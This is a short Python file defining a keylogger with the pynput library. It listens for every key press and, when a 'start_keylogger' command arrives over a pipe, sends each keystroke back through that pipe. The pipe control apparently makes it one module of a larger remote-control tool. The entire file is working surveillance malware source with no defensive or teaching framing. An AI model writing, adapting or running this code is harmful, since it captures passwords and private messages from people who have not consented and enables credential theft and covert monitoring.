from pynput.keyboard import Key, Listener

def keylogger(pipe):
    global on
    on = False
    
    def on_press(key):
        global on
        
        while pipe.poll():
            command = pipe.recv()
            if command == "start_keylogger":
                on = True
            elif command == "stop_keylogger":
                on = False
        if on:
            key = '{0}'.format(key)
            pipe.send(key);
        
    with Listener(on_press=on_press) as listener:
        listener.join()